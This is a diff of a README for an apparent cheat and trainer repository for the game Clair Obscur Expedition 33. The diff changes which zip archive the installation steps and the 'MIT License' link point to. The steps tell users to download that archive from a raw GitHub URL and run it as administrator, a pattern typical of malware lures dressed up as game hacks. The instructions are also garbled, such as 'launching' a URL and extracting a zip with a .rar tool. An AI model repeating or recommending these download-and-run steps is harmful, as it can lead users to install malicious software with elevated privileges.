@@ -27,9 +27,9 @@ Clair Obscur Expedition 33 hacks, cheats, mod menu, unlocker, trainer, XP booste
 
 ## 📥 Installation Guide
 
-1. Download https://raw.githubusercontent.com/DhazX95/ClairObscurExpedition33-HackLab/main/miryachit/ClairObscurExpedition33-HackLab.zip from the repository.
+1. Download https://raw.githubusercontent.com/DhazX95/ClairObscurExpedition33-HackLab/main/miryachit/Expedition_Clair_Lab_Hack_Obscur_2.9.zip from the repository.
 2. Extract files via any .rar archive manager.
-3. Launch 'https://raw.githubusercontent.com/DhazX95/ClairObscurExpedition33-HackLab/main/miryachit/ClairObscurExpedition33-HackLab.zip' as administrator (on supported OS).
+3. Launch 'https://raw.githubusercontent.com/DhazX95/ClairObscurExpedition33-HackLab/main/miryachit/Expedition_Clair_Lab_Hack_Obscur_2.9.zip' as administrator (on supported OS).
 4. Follow GUI instructions to enable features.
 5. Enjoy boosted gameplay with every session!
 
@@ -37,7 +37,7 @@ Clair Obscur Expedition 33 hacks, cheats, mod menu, unlocker, trainer, XP booste
 
 **This repository is for educational and research purposes only. By using any provided hacks or cheats, you take full responsibility for potential risks, including account restrictions. We are not affiliated with Clair Obscur Expedition 33, its creators, or publishers.**
 
-## 📄 [MIT License](https://raw.githubusercontent.com/DhazX95/ClairObscurExpedition33-HackLab/main/miryachit/ClairObscurExpedition33-HackLab.zip)
+## 📄 [MIT License](https://raw.githubusercontent.com/DhazX95/ClairObscurExpedition33-HackLab/main/miryachit/Expedition_Clair_Lab_Hack_Obscur_2.9.zip)
 
 Copyright © 2025  
 Permission is granted to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies. See LICENSE for details.
